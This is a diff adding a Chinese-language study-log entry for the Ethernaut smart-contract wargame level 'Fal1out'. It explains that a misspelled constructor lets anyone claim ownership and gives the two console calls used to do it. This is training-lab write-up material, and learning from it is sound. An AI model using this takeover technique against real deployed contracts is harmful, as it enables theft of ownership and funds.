@@ -72,6 +72,23 @@ await contract.withdraw()
 
 POC: [点这里](Writeup/SpeedX/src/Ethernaut/fallback.sol)
 
+再做下一个 Level 02 Fal1out:
+
+这个感觉超级简单啊， 这个就是合约构造函数名字写错了， 我们直接调用合约Fal1out就可以了
+
+```solidity
+await contract.Fal1out({value: "0"})
+```
+但是提交的时候并没有通过，我想可能是因为我 send 0 ETH， 我又调用了合约的 allocate, 发送了 0.0001 ETH 
+
+```solidity
+await contract.allocate({value: toWei("0.0001")})
+```
+
+这样这一关就通过了, POC: 点这里(Writeup/SpeedX/src/Ethernaut/fal1out.sol)
+
+
+
 ### 2024.08.31
 
 ### 2024.09.01
